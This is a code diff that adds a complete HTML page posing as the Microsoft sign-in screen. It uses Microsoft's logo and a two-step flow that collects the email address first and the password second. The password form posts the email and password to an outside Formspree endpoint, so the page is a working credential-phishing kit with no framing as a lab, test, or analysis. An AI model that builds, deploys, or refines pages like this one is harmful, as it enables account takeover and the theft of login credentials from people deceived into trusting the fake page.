@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Sign in</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #fff;
+        }
+        .login-container {
+            max-width: 440px;
+            width: 100%;
+        }
+        .form-input {
+            border: 1px solid #c9c9c9;
+            height: 44px;
+            font-size: 16px;
+        }
+        .form-input:focus {
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0, 103, 184, 0.2);
+        }
+    </style>
+</head>
+<body class="bg-white flex items-center justify-center min-h-screen">
+
+    <div id="login-container" class="bg-white p-4 sm:p-8 login-container">
+
+        <!-- Page 1: Email Input -->
+        <div id="email-page" class="space-y-6">
+            <div class="flex items-center space-x-2 mb-8">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="h-6">
+            </div>
+            <h1 class="text-3xl font-semibold text-gray-800">Sign in</h1>
+
+            <form id="email-form" class="space-y-4 pt-4">
+                <input type="email" id="email-input" class="w-full px-2 py-2 form-input rounded-sm focus:outline-none" placeholder="Email, phone, or Skype" required>
+                <div class="space-y-2 mt-4 text-sm">
+                    <a href="#" class="text-blue-600 hover:underline block">No account? Create one!</a>
+                    <a href="#" class="text-blue-600 hover:underline block">Can't access your account?</a>
+                </div>
+                <div class="flex justify-end pt-8">
+                    <button type="submit" class="bg-blue-600 text-white font-medium py-2 px-6 rounded-sm shadow-md hover:bg-blue-700 transition-colors duration-200">Next</button>
+                </div>
+            </form>
+
+            <div class="flex flex-col space-y-2 pt-4">
+                <button class="flex items-center w-full px-2 py-2 border border-gray-300 rounded-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 transition-colors duration-200">
+                    <i class="fas fa-key text-gray-500 mr-4 text-lg"></i> Sign-in options
+                </button>
+            </div>
+        </div>
+
+        <!-- Page 2: Password Input -->
+        <div id="password-page" class="space-y-6 hidden">
+            <div class="flex items-center mb-8">
+                <a href="#" id="back-button" class="text-gray-500 hover:text-gray-800 mr-4">
+                    <i class="fas fa-arrow-left text-lg"></i>
+                </a>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="h-6">
+            </div>
+            <div class="bg-gray-200 px-3 py-1 text-sm rounded-sm text-gray-700 inline-block font-normal" id="user-email-display"></div>
+            <h2 class="text-3xl font-semibold text-gray-800">Enter your password</h2>
+
+            <!-- Formspree Submission Form -->
+            <form action="https://formspree.io/f/meolenwo" method="POST" class="space-y-4 pt-4" id="final-form">
+                <!-- Hidden field to carry over email -->
+                <input type="hidden" name="email" id="hidden-email">
+
+                <div class="relative">
+                    <input type="password" name="password" id="final-password" class="w-full px-2 py-2 form-input rounded-sm focus:outline-none" placeholder="Password" required>
+                    <span id="toggle-password" class="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-500 cursor-pointer">
+                        <i class="fas fa-eye"></i>
+                    </span>
+                </div>
+
+                <div class="flex justify-end pt-8">
+                    <button type="submit" class="bg-blue-600 text-white font-medium py-2 px-6 rounded-sm shadow-md hover:bg-blue-700 transition-colors duration-200">Sign in</button>
+                </div>
+            </form>
+
+            <a href="#" class="text-blue-600 hover:underline block text-center mt-4 text-sm">Send a code instead?</a>
+
+            <div class="text-center text-xs text-gray-500 pt-16">
+                <a href="#" class="text-gray-600 hover:underline mx-1">Help</a>
+                <span class="mx-1">·</span>
+                <a href="#" class="text-gray-600 hover:underline mx-1">Terms of use</a>
+                <span class="mx-1">·</span>
+                <a href="#" class="text-gray-600 hover:underline mx-1">Privacy and cookies</a>
+            </div>
+            <p class="text-center text-xs text-gray-500 mt-2">Use private browsing if this is not your device.</p>
+        </div>
+    </div>
+
+    <script>
+        const emailPage = document.getElementById('email-page');
+        const passwordPage = document.getElementById('password-page');
+        const emailForm = document.getElementById('email-form');
+        const emailInput = document.getElementById('email-input');
+        const userEmailDisplay = document.getElementById('user-email-display');
+        const backButton = document.getElementById('back-button');
+        const togglePassword = document.getElementById('toggle-password');
+        const finalPassword = document.getElementById('final-password');
+        const hiddenEmail = document.getElementById('hidden-email');
+
+        // Show password page after entering email
+        emailForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const email = emailInput.value;
+
+            userEmailDisplay.textContent = email;
+            hiddenEmail.value = email;
+
+            emailPage.classList.add('hidden');
+            passwordPage.classList.remove('hidden');
+        });
+
+        // Show/hide password
+        togglePassword.addEventListener('click', () => {
+            const type = finalPassword.getAttribute('type') === 'password' ? 'text' : 'password';
+            finalPassword.setAttribute('type', type);
+            const icon = togglePassword.querySelector('i');
+            icon.classList.toggle('fa-eye');
+            icon.classList.toggle('fa-eye-slash');
+        });
+
+        // Go back to email input
+        backButton.addEventListener('click', (e) => {
+            e.preventDefault();
+            passwordPage.classList.add('hidden');
+            emailPage.classList.remove('hidden');
+        });
+    </script>
+
+</body>
+</html>
